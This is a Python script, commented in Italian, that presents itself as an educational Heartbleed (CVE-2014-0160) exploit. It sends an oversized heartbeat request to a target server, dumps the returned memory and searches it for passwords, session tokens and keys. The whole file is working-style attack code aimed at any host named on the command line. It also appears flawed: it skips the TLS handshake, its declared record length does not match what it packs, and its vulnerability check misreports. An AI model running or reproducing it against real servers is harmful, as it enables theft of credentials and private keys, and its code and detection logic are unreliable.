#!/usr/bin/env python3
"""
Heartbleed Attack - Simplified Educational Version
CVE-2014-0160 - OpenSSL TLS Heartbeat Extension Memory Disclosure
Educational purposes only - Use only in controlled environments
"""

import socket
import struct
import sys
import binascii
from typing import Optional

class HeartbleedScanner:
    def __init__(self, target: str, port: int = 443):
        self.target = target
        self.port = port
        self.socket = None
        
    def connect(self) -> bool:
        """Stabilisce connessione TLS"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            self.socket.connect((self.target, self.port))
            print(f"[+] Connesso a {self.target}:{self.port}")
            return True
        except Exception as e:
            print(f"[-] Errore connessione: {e}")
            return False
    
    def create_heartbeat(self, payload_length: int = 0x4000) -> bytes:
        """Crea pacchetto Heartbeat malizioso"""
        # TLS Record Header
        record_type = 0x18  # Heartbeat
        version = 0x0303    # TLS 1.2
        record_length = 0x0003
        
        # Heartbeat Message
        heartbeat_type = 0x01  # Request
        
        heartbeat = struct.pack('>BHHBHH', 
                              record_type, version, record_length,
                              heartbeat_type, payload_length, 0x00)
        return heartbeat
    
    def hexdump(self, data: bytes, start_address: int = 0) -> None:
        """Visualizza dati in formato hexdump"""
        for i in range(0, len(data), 16):
            hex_part = ' '.join(f'{b:02x}' for b in data[i:i+16])
            text_part = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in data[i:i+16])
            print(f'{start_address + i:04x}: {hex_part:<48} {text_part}')
    
    def search_sensitive_data(self, data: bytes) -> None:
        """Cerca dati sensibili nel memory dump"""
        patterns = {
            'credentials': [b'admin', b'password', b'login', b'username'],
            'session': [b'session', b'cookie', b'token'],
            'private': [b'private', b'secret', b'key'],
            'http': [b'GET', b'POST', b'HTTP']
        }
        
        found_data = False
        for category, pattern_list in patterns.items():
            for pattern in pattern_list:
                if pattern in data:
                    print(f"[!] Trovato pattern '{category}': {pattern}")
                    found_data = True
        
        if not found_data:
            print("[-] Nessun dato sensibile trovato nel dump")
    
    def exploit(self, payload_length: int = 0x4000) -> bool:
        """Esegue l'attacco Heartbleed"""
        if not self.connect():
            return False
            
        try:
            # Invia heartbeat malizioso
            heartbeat = self.create_heartbeat(payload_length)
            self.socket.send(heartbeat)
            print(f"[+] Heartbeat malizioso inviato (length: {payload_length:#06x})")
            
            # Ricevi risposta
            response = self.socket.recv(65536)
            
            if response:
                print(f"[+] Ricevuti {len(response)} bytes di dati")
                print("\n" + "="*60)
                print("HEXDUMP DELLA MEMORIA ESTRATTA:")
                print("="*60)
                
                self.hexdump(response)
                
                print("\n" + "="*60)
                print("ANALISI DATI SENSIBILI:")
                print("="*60)
                self.search_sensitive_data(response)
                
                # Verifica vulnerabilità
                if len(response) > 3:
                    print(f"\n[!] SERVER VULNERABILE - Estratti {len(response)} bytes extra!")
                    return True
                else:
                    print("\n[-] Server non vulnerabile o già patchato")
                    return False
            else:
                print("[-] Nessuna risposta dal server")
                return False
                
        except socket.timeout:
            print("[-] Timeout nella ricezione della risposta")
            return False
        except Exception as e:
            print(f"[-] Errore durante l'exploit: {e}")
            return False
        finally:
            self.socket.close()

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 heartbleed_simple.py <target> [port] [payload_length]")
        print("Example: python3 heartbleed_simple.py www.vulnerable-site.com 443 0x4000")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 443
    payload_length = int(sys.argv[3], 0) if len(sys.argv) > 3 else 0x4000
    
    print("🔓 Heartbleed Vulnerability Scanner")
    print("=" * 50)
    print(f"Target: {target}")
    print(f"Port: {port}")
    print(f"Payload Length: {payload_length:#06x}")
    print("=" * 50)
    
    scanner = HeartbleedScanner(target, port)
    scanner.exploit(payload_length)

if __name__ == "__main__":
    main()
